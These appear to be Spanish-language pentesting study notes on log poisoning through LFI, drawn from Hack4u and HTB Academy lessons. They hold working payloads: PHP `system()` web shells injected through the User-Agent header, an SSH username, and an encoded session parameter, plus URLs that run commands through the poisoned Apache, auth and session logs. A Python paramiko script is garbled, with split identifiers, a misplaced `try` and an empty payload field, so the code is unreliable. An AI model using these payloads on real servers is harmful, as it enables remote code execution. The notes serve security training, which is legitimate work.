---
tags:
  - Web
  - Explotacion
  - Log-Poisoning
---

# Notas

En esto hay muchas variantes y se explota mediante un LFI.
El ataque consiste en manipular los archivos de registro.

## Apache2

Los logs en apache2 normalmente están en la siguiente ruta con los siguientes archivos:

- /var/log/apache2/

En este directorio vemos archivos como **access.log** el cual por defecto muestra los errores en texto plano/legible.

Esto puede ser explotable de la siguiente manera:

En una página web con php podemos ingresar código malicioso haciendo una petición GET con el **User-Agent** editado, donde vamos a poner código php malicioso.

```bash
curl -s -X GET "http://localhost/probando" -H "User-Agent: <?php system('whoami'); ?>"
```

Esto nos ejecutara dicho comando y aparecerá el resultado en el archivo de log.

Para tomar el control de la máquina podemos realizar lo sigueinte:

```bash
curl -s -X GET "http://localhost/probando" -H "User-Agent: <?php system(\$_GET['cmd']); ?>"
```

Ahora apuntando desde la url a el archivo del log tenemos una consola y podemos ejecutar comandos de la siguiente manera:

```
http://localhost/index.php?filename=/var/log/apache2/access.log&cmd=whoami
```

## SSH

Para ssh lo normal es tener el siguiente archivo:

- /var/log/auth.log

Pero hay otro archivo que es el sigueinte:

- /var/log/btmp

En este log nos muestra los registros de acceso.
Si queremos explotarlo podemos realizar la siguiente petición 

```bash
ssh '<?php system($_GET["cmd"]); ?>'@172.17.0.2
```

o de mejor manera con un script de python

```python
import paramiko 
# Configuración de la víctima 
target_ip = "172.17.0.2" 
username = "" 
# Este es el payload PHP 
password = "incorrect_password" 
# Contraseña incorrecta para el intento de conexión 
# Conectar utilizando paramiko 
ssh = paramiko.SSHClient()
ssh.set_missing_host_key_policy(paramiko.AutoAddPoli cy()) try:
	ssh.connect(target_ip, username=username, passwo rd=password)
	print("Conexión exitosa") 
except Exception as e: 
	print(f"Conexión fallida: {str(e)}")
```
# Hack4u

El **Log Poisoning** es una técnica de ataque en la que un atacante **manipula** los **archivos de registro** (**logs**) de una aplicación web para lograr un resultado malintencionado. Esta técnica puede ser utilizada en conjunto con una vulnerabilidad **LFI** para lograr una **ejecución remota de comandos** en el servidor.

Como ejemplos para esta clase, trataremos de envenenar los recursos ‘**auth.log**‘ de **SSH** y ‘**access.log**‘ de **Apache**, comenzando mediante la explotación de una vulnerabilidad LFI primeramente para acceder a estos archivos de registro. Una vez hayamos logrado acceder a estos archivos, veremos cómo manipularlos para incluir código malicioso.

En el caso de los logs de SSH, el atacante puede inyectar código PHP en el campo de **usuario** durante el proceso de autenticación. Esto permite que el código se registre en el log ‘**auth.log**‘ de SSH y sea interpretado en el momento en el que el archivo de registro sea leído. De esta manera, el atacante puede lograr una ejecución remota de comandos en el servidor.

En el caso del archivo ‘**access.log**‘ de Apache, el atacante puede inyectar código PHP en el campo **User-Agent** de una solicitud HTTP. Este código malicioso se registra en el archivo de registro ‘access.log’ de Apache y se ejecuta cuando el archivo de registro es leído. De esta manera, el atacante también puede lograr una ejecución remota de comandos en el servidor.

Cabe destacar que en algunos sistemas, el archivo ‘**auth.log**‘ no es utilizado para registrar los eventos de autenticación de SSH. En su lugar, los eventos de autenticación pueden ser registrados en archivos de registro con diferentes nombres, como ‘**btmp**‘.

Por ejemplo, en sistemas basados en Debian y Ubuntu, los eventos de autenticación de SSH se registran en el archivo ‘auth.log’. Sin embargo, en sistemas basados en Red Hat y CentOS, los eventos de autenticación de SSH se registran en el archivo ‘btmp’. Aunque a veces pueden haber excepciones.

Para prevenir el Log Poisoning, es importante que los desarrolladores limiten el acceso a los archivos de registro y aseguren que estos archivos se almacenen en un lugar seguro. Además, es importante que se valide adecuadamente la entrada del usuario y se filtre cualquier intento de entrada maliciosa antes de registrarla en los archivos de registro.

# HTB Academy

Hemos visto en secciones anteriores que si incluimos algún archivo que contenga código PHP, se ejecutará, siempre y cuando la función vulnerable tenga el `Execute` privilegios. Los ataques que discutiremos en esta sección se basan en el mismo concepto: Escribir código PHP en un campo que controlamos que se registra en un archivo de registro (es decir. `poison`/`contaminate` el archivo de registro), y luego incluir ese archivo de registro para ejecutar el código PHP. Para que este ataque funcione, la aplicación web PHP debe tener privilegios de lectura sobre los archivos registrados, que varían de un servidor a otro.

Como fue el caso en el apartado anterior, cualquiera de las siguientes funciones con `Execute` los privilegios deben ser vulnerables a estos ataques:

|**Función**|**Leer Contenido**|**Ejecutar**|**URL remota**|
|---|:-:|:-:|:-:|
|**PHP**||||
|`include()`/`include_once()`|✅|✅|✅|
|`require()`/`require_once()`|✅|✅|❌|
|**NodoJS**||||
|`res.render()`|✅|✅|❌|
|**Java**||||
|`import`|✅|✅|✅|
|**.NETO**||||
|`include`|✅|✅|✅|

## PHP Session Poisoning

La mayoría de las aplicaciones web PHP utilizan `PHPSESSID` cookies, que pueden contener datos específicos relacionados con el usuario en el back-end, por lo que la aplicación web puede realizar un seguimiento de los detalles del usuario a través de sus cookies. 

Estos detalles se almacenan en `session` archivos en el back-end y guardados en:
- Linux: `/var/lib/php/sessions/` 
- Windows :`C:\Windows\Temp\` 

 los datos de nuestro usuario coincide con el nombre de nuestro `PHPSESSID` cookie con el `sess_` prefijo. Por ejemplo, si el `PHPSESSID` la cookie está configurada para `el4ukv0kqbvoirg7nkp4dncpk3`, entonces su ubicación en el disco sería `/var/lib/php/sessions/sess_el4ukv0kqbvoirg7nkp4dncpk3`.



Lo primero tenemos que examinar nuestro archivo de sesión PHPSESSID y ver si contiene algún dato que podamos controlar y envenenar. Entonces, primero verifiquemos si tenemos un `PHPSESSID` cookie establecida en nuestra sesión:

![imagen](https://academy.hackthebox.com/storage/modules/23/rfi_cookies_storage.png)

Como podemos ver, nuestro `PHPSESSID` el valor de la cookie es `nhhv8i0o6ua4g88bkdl9u1fdsd`, por lo que debe almacenarse en `/var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd`. Intentemos incluir este archivo de sesión a través de la vulnerabilidad LFI y ver su contenido:

```
http://<SERVER_IP>:<PORT>/index.php?language=/var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd
```

![](https://academy.hackthebox.com/storage/modules/23/rfi_session_include.png)


Podemos ver que el archivo de sesión contiene dos valores: 
- `page`:  muestra la página de idioma seleccionada 
	- Bajo nuestro control, ya que podemos controlarlo a través del `?language=` parámetro.

- `preference`: muestra el idioma seleccionado. 
	- No está bajo nuestro control, ya que no lo especificamos en ninguna parte y debe especificarse automáticamente. 



Intentemos establecer el valor de `page` un valor personalizado (p. ej. `language parameter`) y ver si cambia en el archivo de sesión. 
Podemos hacerlo simplemente visitando la página con `?language=session_poisoning` especificado, como sigue:

```url
http://<SERVER_IP>:<PORT>/index.php?language=session_poisoning
```


Ahora, vamos a incluir el archivo de sesión una vez más para ver el contenido:

![](https://academy.hackthebox.com/storage/modules/23/lfi_poisoned_sessid.png)


Esta vez, el archivo de sesión contiene `session_poisoning` en lugar de `es.php`, lo que confirma nuestra capacidad para controlar el valor de `page` en el archivo de sesión. 

Nuestro siguiente paso es realizar el `poisoning` paso escribiendo código PHP en el archivo de sesión. 

Podemos escribir un shell web PHP básico cambiando el `?language=` parámetro de un shell web codificado por URL, de la siguiente manera:

```url
http://<SERVER_IP>:<PORT>/index.php?language=%3C%3Fphp%20system%28%24_GET%5B%22cmd%22%5D%29%3B%3F%3E
```


Finalmente, podemos incluir el archivo de sesión y usar el `&cmd=id` para ejecutar comandos:

```
http://<SERVER_IP>:<PORT>/index.php?language=/var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd&cmd=id
```


>**Nota:** 
>Para ejecutar otro comando, el archivo de sesión debe envenenarse con el shell web nuevamente, a medida que se sobrescribe `/var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd` después de nuestra última inclusión. Idealmente, usaríamos el shell web envenenado para escribir un shell web permanente en el directorio web, o enviar un shell inverso para facilitar la interacción.



## Server Log Poisoning

Ambos `Apache` y `Nginx` mantener varios archivos de registro, como `access.log` y `error.log`. 
El `access.log` el archivo contiene información diversa sobre todas las solicitudes realizadas al servidor, incluidas las de cada solicitud `User-Agent` encabezado. 
Como podemos controlar el `User-Agent` encabezado en nuestras solicitudes, podemos usarlo para envenenar los registros del servidor como lo hicimos anteriormente.

Una vez envenenados, necesitamos incluir los registros a través de la vulnerabilidad LFI, y para eso necesitamos tener acceso de lectura sobre los registros. `Nginx` los registros son legibles por usuarios con privilegios bajos de forma predeterminada (por ejemplo. `www-data`), mientras que el `Apache` los registros solo son legibles por usuarios con altos privilegios (por ejemplo. `root`/`adm` grupos). Sin embargo, en más antiguo o mal configurado `Apache` servidores, estos registros pueden ser legibles por usuarios de bajo privilegio.

- `Apache` los registros se encuentran en `/var/log/apache2/` en Linux y en `C:\xampp\apache\logs\` en Windows, mientras 
- `Nginx`
	- Linux `/var/log/nginx/`
	- Windows `C:\nginx\log\`

>**NOTA IMPORTANTE**
Sin embargo, los registros pueden estar en una ubicación diferente en algunos casos, por lo que podemos usar un [LFI Lista de palabras](https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/LFI) para fuzz para sus ubicaciones, como se discutirá en la siguiente sección.



Entonces, intentemos incluir el registro de acceso de Apache desde `/var/log/apache2/access.log`, y ver lo que obtenemos:

```
http://<SERVER_IP>:<PORT>/index.php?language=/var/log/apache2/access.log
```

![](https://academy.hackthebox.com/storage/modules/23/rfi_access_log.png)


Como podemos ver, podemos leer el registro. El registro contiene el `remote IP address`, `request page`, `response code`, y el `User-Agent` encabezado. Como se mencionó anteriormente, el `User-Agent` el encabezado es controlado por nosotros a través de los encabezados de solicitud HTTP, por lo que deberíamos poder envenenar este valor.

>**Consejo:** 
>Los registros tienden a ser enormes, y cargarlos en una vulnerabilidad LFI puede tardar un tiempo en cargarse, o incluso bloquear el servidor en el peor de los casos. Por lo tanto, tenga cuidado y sea eficiente con ellos en un entorno de producción, y no envíe solicitudes innecesarias.

Para hacerlo, usaremos `Burp Suite` para interceptar nuestra solicitud anterior de LFI y modificar el `User-Agent` encabezado a `Apache Log Poisoning`: ![imagen](https://academy.hackthebox.com/storage/modules/23/rfi_repeater_ua.png)

>**Nota:** 
>Como todas las solicitudes al servidor se registran, podemos envenenar cualquier solicitud a la aplicación web, y no necesariamente la LFI como lo hicimos anteriormente.


Como era de esperar, nuestro valor personalizado User-Agent es visible en el archivo de registro incluido. Ahora, podemos envenenar el `User-Agent` encabezado configurándolo en un shell web PHP básico: ![imagen](https://academy.hackthebox.com/storage/modules/23/rfi_cmd_repeater.png)

También podemos envenenar el registro enviando una solicitud a través de cURL, de la siguiente manera:

```shell-session
vcrdcr@htb[/htb]$ curl -s "http://<SERVER_IP>:<PORT>/index.php" -A "<?php system($_GET['cmd']); ?>"
```


Como el registro ahora debería contener código PHP, la vulnerabilidad LFI debería ejecutar este código y deberíamos poder obtener la ejecución remota de código. Podemos especificar un comando a ejecutar con (`?cmd=id`): ![imagen](https://academy.hackthebox.com/storage/modules/23/rfi_id_repeater.png)


### Otros

Vemos que ejecutamos con éxito el comando. Se puede llevar a cabo exactamente el mismo ataque `Nginx` registros también.

**Consejo:** El `User-Agent` el encabezado también se muestra en los archivos de proceso bajo Linux `/proc/` directorio. Entonces, podemos intentar incluir el `/proc/self/environ` o `/proc/self/fd/N` archivos (donde N es un PID por lo general entre 0-50), y podemos ser capaces de realizar el mismo ataque a estos archivos. Esto puede ser útil en caso de que no tuviéramos acceso de lectura a través de los registros del servidor, sin embargo, estos archivos solo pueden ser legibles por usuarios privilegiados también.

Finalmente, hay otras técnicas similares de envenenamiento de registros que podemos utilizar en varios registros del sistema, dependiendo de los registros sobre los que hayamos leído el acceso. Los siguientes son algunos de los registros de servicio que podemos leer:

- `/var/log/sshd.log`
- `/var/log/mail`
- `/var/log/vsftpd.log`

Primero debemos intentar leer estos registros a través de LFI, y si tenemos acceso a ellos, podemos tratar de envenenarlos como lo hicimos anteriormente. Por ejemplo, si el `ssh` o `ftp` los servicios están expuestos a nosotros, y podemos leer sus registros a través de LFI, luego podemos intentar iniciar sesión en ellos y establecer el nombre de usuario en código PHP, y al incluir sus registros, el código PHP se ejecutaría. Lo mismo se aplica al `mail` servicios, como podemos enviar un correo electrónico que contiene código PHP, y tras su inclusión de registro, el código PHP se ejecutaría. Podemos generalizar esta técnica a cualquier registro que registre un parámetro que controlamos y que podamos leer a través de la vulnerabilidad LFI.


# Laboratorios

